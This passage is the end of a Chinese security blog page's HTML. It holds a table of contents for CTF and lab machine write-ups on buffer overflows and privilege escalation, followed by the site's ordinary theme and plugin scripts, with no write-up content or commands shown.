toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%9E%9A%E4%B8%BE"><span class="toc-text">常规枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fuzzing"><span class="toc-text">Fuzzing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEeip"><span class="toc-text">寻找EIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9Abadchars"><span class="toc-text">确定badchars</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%8B%BF%E5%88%B0shell"><span class="toc-text">缓冲区溢出拿到shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x14-gatekeeper"><span class="toc-text">0x14 Gatekeeper</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%89%AB%E6%8F%8F"><span class="toc-text">常规扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fuzzing"><span class="toc-text">Fuzzing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEeip"><span class="toc-text">寻找EIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9Abadchars"><span class="toc-text">确定badchars</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E6%8B%BFshell"><span class="toc-text">Shellcode拿shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x15-brainpan-1"><span class="toc-text">0x15 Brainpan 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%89%AB%E6%8F%8F"><span class="toc-text">常规扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B"><span class="toc-text">目录探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fuzzing"><span class="toc-text">Fuzzing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEeip"><span class="toc-text">寻找EIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9Abadchars"><span class="toc-text">确定badchars</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="toc-text">提升权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x16-mr-robot-ctf"><span class="toc-text">0X16 Mr Robot CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%9E%9A%E4%B8%BE"><span class="toc-text">常规枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B"><span class="toc-text">目录探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%8B%BFshell"><span class="toc-text">文件上传拿Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="toc-text">提升权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#killchain-summary"><span class="toc-text">KillChain Summary</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x17-retro"><span class="toc-text">0x17 Retro</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E8%AF%B4%E6%98%8E"><span class="toc-text">靶机说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%9E%9A%E4%B8%BE"><span class="toc-text">常规枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B"><span class="toc-text">目录探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-text">提权方法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">提权方法二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#killchain-summary"><span class="toc-text">KillChain Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
